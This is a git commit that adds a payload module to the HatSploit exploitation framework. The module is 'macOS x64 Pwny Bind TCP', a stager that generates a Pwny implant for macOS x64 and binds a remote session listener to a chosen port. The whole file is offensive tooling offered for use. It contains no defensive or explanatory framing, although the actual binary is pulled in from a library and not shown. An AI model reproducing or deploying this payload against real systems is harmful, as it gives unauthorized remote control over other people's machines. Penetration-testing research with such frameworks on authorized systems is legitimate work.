a4b60d5526538dd767c0069b1dc7b465f0a6c1b4
Ivan Nikolsky <enty8080@gmail.com>
2022-02-11 02:30:50 +0300

    Create pwny_bind_tcp.py

---
+++ hatsploit/payloads/macos/x64/pwny_bind_tcp.py
@@ -0,0 +1,35 @@
+#!/usr/bin/env python3
+
+#
+# This payload requires HatSploit: https://hatsploit.netlify.app
+# Current source: https://github.com/EntySec/HatSploit
+#
+
+from pwny import Pwny
+from pwny.session import PwnySession
+
+from hatsploit.lib.payload import Payload
+
+
+class HatSploitPayload(Payload, Pwny):
+    details = {
+        'Category': "stager",
+        'Name': "macOS x64 Pwny Bind TCP",
+        'Payload': "macos/x64/pwny_bind_tcp",
+        'Authors': [
+            'Ivan Nikolsky (enty8080) - payload developer'
+        ],
+        'Description': "Pwny bind TCP payload for macOS x64.",
+        'Architecture': "x64",
+        'Platform': "macos",
+        'Session': PwnySession,
+        'Rank': "high",
+        'Type': "bind_tcp"
+    }
+
+    def run(self):
+        return self.get_pwny(
+            self.details['Platform'],
+            self.details['Architecture'],
+            None, self.handler['BPORT']
+        )
